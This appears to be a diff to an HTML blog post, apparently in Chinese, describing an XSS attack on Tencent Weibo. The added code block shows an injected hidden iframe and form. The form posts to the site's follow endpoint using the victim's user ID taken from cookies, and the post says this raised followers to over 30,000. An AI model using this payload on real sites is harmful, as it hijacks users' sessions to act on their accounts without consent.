@@ -140,6 +140,21 @@ $(document).bind('DOMNodeInserted', function(event) {
 </span></code></pre></td></tr></table></div></figure>
 
 
+<p>innerHTML被修改为</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">style</span><span class="o">=</span><span class="s1">&#39;display:none&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;mj&#39;</span><span class="o">&gt;&lt;</span><span class="err">/iframe&gt;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="s1">&#39;POST&#39;</span> <span class="nx">id</span><span class="o">=</span><span class="s1">&#39;mi&#39;</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;http://radio.t.qq.com/mini/follow.php&#39;</span> <span class="nx">target</span><span class="o">=</span><span class="s1">&#39;mj&#39;</span><span class="o">&gt;</span>
+</span><span class='line'>  <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s1">&#39;hidden&#39;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot; + window.u + &quot;&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;u&#39;</span> <span class="o">/&gt;</span>
+</span><span class='line'>  <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s1">&#39;hidden&#39;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot; + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || [&quot;&quot;, &quot;&quot;])[1] | 0) + &quot;&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;uin&#39;</span> <span class="o">/&gt;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="err">/form&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
 <p>粉丝数刷到3w+</p>
 
 <p><img src="http://jason5.cn/images/xss-weibo2.png" alt="" /></p>
